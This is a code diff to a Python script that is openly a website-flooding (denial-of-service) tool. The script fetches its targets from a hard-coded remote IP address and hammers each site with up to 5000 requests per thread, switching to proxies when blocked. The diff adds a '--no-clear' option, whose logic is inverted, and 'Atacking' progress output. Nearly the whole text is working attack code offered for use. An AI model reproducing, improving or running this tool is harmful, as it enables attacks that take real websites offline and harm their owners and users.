@@ -17,7 +17,7 @@ import platform
 import json
 import sys
 
-VERSION = 5
+VERSION = 6
 HOSTS = ["http://46.4.63.238/api.php"]
 MAX_REQUESTS = 5000
 disable_warnings()
@@ -35,9 +35,12 @@ threads = int(sys.argv[1])
 
 parser = ArgumentParser()
 parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
+parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
 parser.set_defaults(verbose=False)
+parser.set_defaults(no_clear=False)
 args, unknown = parser.parse_known_args()
 verbose = args.verbose
+no_clear = args.no_clear
 
 def checkReq():
     os.system("python3 -m pip install -r requirements.txt")
@@ -96,7 +99,11 @@ def mainth():
         attacks_number = 0
 
         try:
+            if not verbose:
+              print('Atacking', end ='')
+
             attack = scraper.get(site)
+
             if attack.status_code >= 302:
                 for proxy in data['proxy']:
                     scraper.proxies.update(
@@ -109,6 +116,8 @@ def mainth():
                             if verbose:
                               logger.info("ATTACKED; RESPONSE CODE: " +
                                           str(response.status_code))
+                            else:
+                              print('.', end ='')
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
@@ -116,6 +125,8 @@ def mainth():
                     if verbose:
                       logger.info("ATTACKED; RESPONSE CODE: " +
                                   str(response.status_code))
+                    else:
+                      print('.', end ='')
             if attacks_number > 0:
               logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
         except:
@@ -127,12 +138,15 @@ def cleaner():
     while True:
         sleep(60)
         checkUpdate()
-        clear()
+
+        if no_clear:
+          clear()
         collect()
 
 
 if __name__ == '__main__':
-    clear()
+    if no_clear:
+      clear()
     checkReq()
     checkUpdate()
     for _ in range(threads):
